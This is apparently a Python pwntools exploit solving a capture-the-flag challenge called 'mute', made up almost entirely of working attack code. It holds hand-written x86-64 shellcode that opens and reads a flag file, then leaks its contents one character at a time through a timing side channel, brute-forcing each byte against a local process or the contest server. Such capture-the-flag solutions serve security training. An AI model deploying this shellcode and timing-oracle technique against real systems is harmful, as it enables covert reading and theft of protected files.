import string
from datetime import datetime
from pwn import *
import os

shell = "\x49\xb8\x74\x65\x2f\x66\x6c\x61\x67\x00\x41\x50\x49\xb8\x2f\x68\x6f\x6d\x65\x2f\x6d\x75\x41\x50\x48\x89\xe7\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x80\x7e\x01\x69\x75\x18\xb9\x00\x00\x00\x00\xff\xc1\x83\xf9\xff\x75\xf9\xb9\x00\x00\x00\x00\xff\xc1\x83\xf9\xff\x75\xf9\x48\x31\xc0\x04\x3c\x0f\x05"

flag = ""
i = 0

count = 0

while True:
    for c in string.printable:
        try:
            current_shell = shell.replace("\x01\x69", chr(i) + c)+"\x00"*4009
            #p = remote("mute_9c1e11b344369be9b6ae0caeec20feb8.quals.shallweplayaga.me", 443)
            p = process("./mute")

            if count == 0:
                raw_input()
                count += 1

            p.recvuntil("SILENCE, FOUL DAEMON!\n")
            start = datetime.now()
            #print current_shell
            p.sendline(current_shell)
            p.recvall()
            #os.popen("python -c 'print(\"" + current_shell + "\" + \"\x00\"*4009)' | ./mute") # nc mute_9c1e11b344369be9b6ae0caeec20feb8.quals.shallweplayaga.me 443
            total = (datetime.now() - start).seconds
            if total >= 1:
                i += 1
                flag += c
                print("FOUND!!!!! : " + flag)
                print(flag)
                break;
            print total
            #raw_input()
            #p.close()
        except:
            print "error"
            p.close()
            pass